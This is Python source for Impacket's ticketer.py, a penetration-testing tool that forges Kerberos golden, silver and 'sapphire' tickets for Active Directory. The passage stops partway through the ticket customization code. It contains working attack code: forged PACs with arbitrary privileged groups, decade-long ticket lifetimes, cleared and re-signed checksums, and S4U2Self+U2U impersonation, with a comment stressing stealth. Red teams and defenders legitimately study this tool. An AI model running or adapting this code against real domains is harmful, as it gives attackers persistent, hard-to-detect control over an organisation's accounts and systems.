#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
#   allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
#   groups, extrasids, etc.
#   Tickets duration is fixed to 10 years from now (although you can manually change it)
#
#   Examples:
#       ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
#
#       will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
#       If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
#       (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
#       baduser.ccache.
#
#       ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
#                     -request -user <a valid domain user> -password <valid domain user's password> baduser
#
#       will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
#       as template for customization. Whatever encryption algorithms used on that ticket will be honored,
#       hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser' and saved
#       as baduser.ccache.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   - Original presentation at BlackHat USA 2014 by @gentilkiwi and @passingthehash:
#     (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)
#   - Original implementation by Benjamin Delpy (@gentilkiwi) in mimikatz
#     (https://github.com/gentilkiwi/mimikatz)
#
# ToDo:
#   [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
#   [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import string
import struct
import sys
from calendar import timegm
from time import strptime
from binascii import unhexlify
from six import b

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.dtypes import RPC_SID, SID
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
    SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.examples import logger
from impacket.krb5.asn1 import AS_REP, TGS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart, EncTGSRepPart, AD_IF_RELEVANT
from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionTypes, \
    PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
    KERB_NON_KERB_CKSUM_SALT
from impacket.krb5.keytab import Keytab
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.crypto import _checksum_table, Enctype
from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
    VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO, UPN_DNS_INFO_FULL, PAC_REQUESTOR_INFO, PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO, PAC_REQUESTOR, \
    PAC_ATTRIBUTE_INFO
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS

from impacket.krb5 import constants, pac
from impacket.krb5.asn1 import AP_REQ, TGS_REQ, Authenticator, seq_set, seq_set_iter, PA_FOR_USER_ENC, Ticket as TicketAsn1
from impacket.krb5.crypto import _HMACMD5, _AES256CTS, string_to_key
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import Ticket
from impacket.winregistry import hexdump

class TICKETER:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__target = target
        self.__domain = domain
        self.__options = options
        self.__tgt = None
        self.__tgt_session_key = None
        if options.spn:
            spn = options.spn.split('/')
            self.__service = spn[0]
            self.__server = spn[1]
            if options.keytab is not None:
                self.loadKeysFromKeytab(options.keytab)

        # we are creating a golden ticket
        else:
            self.__service = 'krbtgt'
            self.__server = self.__domain

    @staticmethod
    def getFileTime(t):
        t *= 10000000
        t += 116444736000000000
        return t

    @staticmethod
    def getPadLength(data_length):
        return ((data_length + 7) // 8 * 8) - data_length

    @staticmethod
    def getBlockLength(data_length):
        return (data_length + 7) // 8 * 8

    def loadKeysFromKeytab(self, filename):
        keytab = Keytab.loadFile(filename)
        keyblock = keytab.getKey("%s@%s" % (options.spn, self.__domain))
        if keyblock:
            if keyblock["keytype"] == Enctype.AES256 or keyblock["keytype"] == Enctype.AES128:
                options.aesKey = keyblock.hexlifiedValue()
            elif keyblock["keytype"] == Enctype.RC4:
                options.nthash = keyblock.hexlifiedValue()
        else:
            logging.warning("No matching key for SPN '%s' in given keytab found!", options.spn)

    def createBasicValidationInfo(self):
        # 1) KERB_VALIDATION_INFO
        kerbdata = KERB_VALIDATION_INFO()

        aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
        unixTime = self.getFileTime(aTime)

        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

        # LogoffTime: A FILETIME structure that contains the time the client's logon
        # session should expire. If the session should not expire, this structure
        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
        # an indicator of when to warn the user that the allowed time is due to expire.
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF

        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
        # client should not be logged off, this structure SHOULD have the dwHighDateTime
        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
        # The Kerberos service ticket end time is a replacement for KickOffTime.
        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
        # of when the client should be forcibly disconnected.
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32

        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0

        # PasswordMustChange: A FILETIME structure that contains the time at which
        # theclient's password expires. If the password will not expire, this
        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
        # dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName'] = self.__target
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 500
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = int(self.__options.user_id)

        # Our Golden Well-known groups! :)
        groups = self.__options.groups.split(',')
        if len(groups) == 0:
            # PrimaryGroupId must be set, default to 513 (Domain User)
            kerbdata['PrimaryGroupId'] = 513
        else:
            # Using first group as primary group
            kerbdata['PrimaryGroupId'] = int(groups[0])
        kerbdata['GroupCount'] = len(groups)

        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = int(group)
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags'] = 0
        kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['LogonServer'] = ''
        kerbdata['LogonDomainName'] = self.__domain.upper()
        kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
        kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0

        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL

        validationInfo = VALIDATION_INFO()
        validationInfo['Data'] = kerbdata

        return validationInfo

    def createBasicPac(self, kdcRep):
        validationInfo = self.createBasicValidationInfo()
        pacInfos = {}
        pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
        srvCheckSum = PAC_SIGNATURE_DATA()
        privCheckSum = PAC_SIGNATURE_DATA()

        if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:
            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            srvCheckSum['Signature'] = b'\x00' * 16
            privCheckSum['Signature'] = b'\x00' * 16
        else:
            srvCheckSum['Signature'] = b'\x00' * 12
            privCheckSum['Signature'] = b'\x00' * 12
            if len(self.__options.aesKey) == 64:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
            else:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value

        pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
        pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()

        clientInfo = PAC_CLIENT_INFO()
        clientInfo['Name'] = self.__target.encode('utf-16le')
        clientInfo['NameLength'] = len(clientInfo['Name'])
        pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

        if self.__options.extra_pac:
            self.createUpnDnsPac(pacInfos)

        if self.__options.old_pac is False:
            self.createAttributesInfoPac(pacInfos)
            self.createRequestorInfoPac(pacInfos)

        return pacInfos

    def createUpnDnsPac(self, pacInfos):
        upnDnsInfo = UPN_DNS_INFO_FULL()

        PAC_pad = b'\x00' * self.getPadLength(len(upnDnsInfo))
        upn_data = f"{self.__target.lower()}@{self.__domain.lower()}".encode("utf-16-le")
        upnDnsInfo['UpnLength'] = len(upn_data)
        upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)
        total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']
        pad = self.getPadLength(total_len)
        upn_data += b'\x00' * pad

        dns_name = self.__domain.upper().encode("utf-16-le")
        upnDnsInfo['DnsDomainNameLength'] = len(dns_name)
        upnDnsInfo['DnsDomainNameOffset'] = total_len + pad
        total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']
        pad = self.getPadLength(total_len)
        dns_name += b'\x00' * pad

        # Enable additional data mode (Sam + SID)
        upnDnsInfo['Flags'] = 2

        samName = self.__target.encode("utf-16-le")
        upnDnsInfo['SamNameLength'] = len(samName)
        upnDnsInfo['SamNameOffset'] = total_len + pad
        total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']
        pad = self.getPadLength(total_len)
        samName += b'\x00' * pad

        user_sid = SID()
        user_sid.fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")
        upnDnsInfo['SidLength'] = len(user_sid)
        upnDnsInfo['SidOffset'] = total_len + pad
        total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']
        pad = self.getPadLength(total_len)
        user_data = user_sid.getData() + b'\x00' * pad

        # Post-PAC data
        post_pac_data = upn_data + dns_name + samName + user_data
        # Pac data building
        pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data

    @staticmethod
    def createAttributesInfoPac(pacInfos):
        pacAttributes = PAC_ATTRIBUTE_INFO()
        pacAttributes["FlagsLength"] = 2
        pacAttributes["Flags"] = 1

        pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()

    def createRequestorInfoPac(self, pacInfos):
        pacRequestor = PAC_REQUESTOR()
        pacRequestor['UserSid'] = SID()
        pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")

        pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()

    def createBasicTicket(self):
        if self.__options.request is True:
            if self.__domain == self.__server:
                logging.info('Requesting TGT to target domain to use as basis')
            else:
                logging.info('Requesting TGT/TGS to target domain to use as basis')

            if self.__options.hashes is not None:
                lmhash, nthash = self.__options.hashes.split(':')
            else:
                lmhash = ''
                nthash = ''
            userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(lmhash), unhexlify(nthash), None,
                                                                    self.__options.dc_ip)
            self.__tgt, self.__tgt_cipher, self.__tgt_session_key = tgt, cipher, sessionKey
            if self.__domain == self.__server:
                kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            else:
                serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None, tgt, cipher,
                                                                        sessionKey)
                kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            # Let's check we have all the necessary data based on the ciphers used. Boring checks
            ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
            encPartCipher = int(kdcRep['enc-part']['etype'])

            if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and \
                            self.__options.nthash is None:
                logging.critical('rc4_hmac is used in this ticket and you haven\'t specified the -nthash parameter. '
                                 'Can\'t continue ( or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is None:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is not None and len(self.__options.aesKey) > 32:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if ( ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and \
                 self.__options.aesKey is not None and len(self.__options.aesKey) < 64:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. '
                    'Can\'t continue')
                return None, None
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target

        else:
            logging.info('Creating basic skeleton ticket and PAC Infos')
            if self.__domain == self.__server:
                kdcRep = AS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
            else:
                kdcRep = TGS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
            kdcRep['pvno'] = 5
            if self.__options.nthash is None:
                kdcRep['padata'] = noValue
                kdcRep['padata'][0] = noValue
                kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value

                etype2 = ETYPE_INFO2()
                etype2[0] = noValue
                if len(self.__options.aesKey) == 64:
                    etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)
                encodedEtype2 = encoder.encode(etype2)

                kdcRep['padata'][0]['padata-value'] = encodedEtype2

            kdcRep['crealm'] = self.__domain.upper()
            kdcRep['cname'] = noValue
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__target

            kdcRep['ticket'] = noValue
            kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
            kdcRep['ticket']['realm'] = self.__domain.upper()
            kdcRep['ticket']['sname'] = noValue
            kdcRep['ticket']['sname']['name-string'] = noValue
            kdcRep['ticket']['sname']['name-string'][0] = self.__service

            if self.__domain == self.__server:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
            else:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__server

            kdcRep['ticket']['enc-part'] = noValue
            kdcRep['ticket']['enc-part']['kvno'] = 2
            kdcRep['enc-part'] = noValue
            if self.__options.nthash is None:
                if len(self.__options.aesKey) == 64:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
            else:
                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
                kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value

            kdcRep['enc-part']['kvno'] = 2
            kdcRep['enc-part']['cipher'] = noValue

        pacInfos = self.createBasicPac(kdcRep)

        return kdcRep, pacInfos


    def getKerberosS4U2SelfU2U(self):
        tgt = self.__tgt
        cipher = self.__tgt_cipher
        sessionKey = self.__tgt_session_key
        kdcHost = self.__options.dc_ip

        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('CheckSum')
            hexdump(checkSum)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('PA_FOR_USER_ENC')
            print(paForUserEnc.prettyPrint())

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.renewable_ok.value)
        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        message = encoder.encode(tgsReq)
        r = sendReceive(message, self.__domain, kdcHost)
        return r, None, sessionKey, None


    def customizeTicket(self, kdcRep, pacInfos):
        logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))

        ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=int(self.__options.duration))

        if self.__options.impersonate:
            # Doing Sapphire Ticket
            # todo : in its actual form, ticketer is limited to the PAC structures that are supported in impacket.
            #  Unsupported structures will be ignored. The PAC is not completely copy-pasted here.

            # 1. S4U2Self + U2U
            logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
            tgs, cipher, oldSessionKey, sessionKey = self.getKerberosS4U2SelfU2U()

            # 2. extract PAC
            logging.info('\tDecrypting ticket & extracting PAC')
            decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
            cipherText = decodedTicket['ticket']['enc-part']['cipher']
            newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]
            plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Let's extend the ticket's validity a lil bit
            # I don't think this part should be left in the code. The whole point of doing a sapphire ticket is stealth, extending ticket duration is not the way to go
            # encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
            # encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)

            # Opening PAC
            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
            pacInfos = dict()
            buff = pacType['Buffers']

            # clearing the signatures so that we can sign&encrypt later on
            AttributesInfoPacInS4UU2UPAC = False
            RequestorInfoPacInS4UU2UPAC = False
            logging.info("\tClearing signatures")
            for bufferN in range(pacType['cBuffers']):
                infoBuffer = pac.PAC_INFO_BUFFER(buff)
                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
                buff = buff[len(infoBuffer):]
                if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:
                    checksum = PAC_SIGNATURE_DATA(data)
                    if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                        checksum['Signature'] = '\x00' * 12
                    elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                        checksum['Signature'] = '\x00' * 12
                    else:
                        checksum['Signature'] = '\x00' * 16
                    pacInfos[infoBuffer['ulType']] = checksum.getData()
                elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
                    AttributesInfoPacInS4UU2UPAC = True
                    pacInfos[infoBuffer['ulType']] = data
                elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
                    RequestorInfoPacInS4UU2UPAC = True
                    pacInfos[infoBuffer['ulType']] = data
                else:
                    pacInfos[infoBuffer['ulType']] = data

            # adding the Requestor and Attributes structures manually if they were not in the S4U2self+U2U ticket's PAC
            if self.__options.old_pac is False and not AttributesInfoPacInS4UU2UPAC:
                self.createAttributesInfoPac(pacInfos)
            if self.__options.old_pac is False and not RequestorInfoPacInS4UU2UPAC:
                if self.__options.user_id == "500":
                    logging.warning("User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. "
                        "If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id "
                        "with the RID of the target user to impersonate")
                self.createRequestorInfoPac(pacInfos)

            # changing ticket flags to match TGT / ST
            logging.info("\tAdding necessary ticket flags")
            originalFlags = [i for i, x in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']
            flags = originalFlags
            newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]
            if self.__domain == self.__server:
                newFlags.append(TicketFlags.initial.value)
            for newFlag in newFlags:
                if newFlag not in originalFlags:
                    flags.append(newFlag)
            encTicketPart['flags'] = encodeFlags(flags)

            # changing key type to match what the TGT we obtained
            logging.info("\tChanging keytype")
            encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']
            if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
            elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
            else:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

        else:
            encTicketPart = EncTicketPart()

            flags = list()
            flags.append(TicketFlags.forwardable.value)
            flags.append(TicketFlags.proxiable.value)
            flags.append(TicketFlags.renewable.value)
            if self.__domain == self.__server:
                flags.append(TicketFlags.initial.value)
            flags.append(TicketFlags.pre_authent.value)
            encTicketPart['flags'] = encodeFlags(flags)
            encTicketPart['key'] = noValue
            encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']

            if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
            elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
            else:
                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

            encTicketPart['crealm'] = self.__domain.upper()
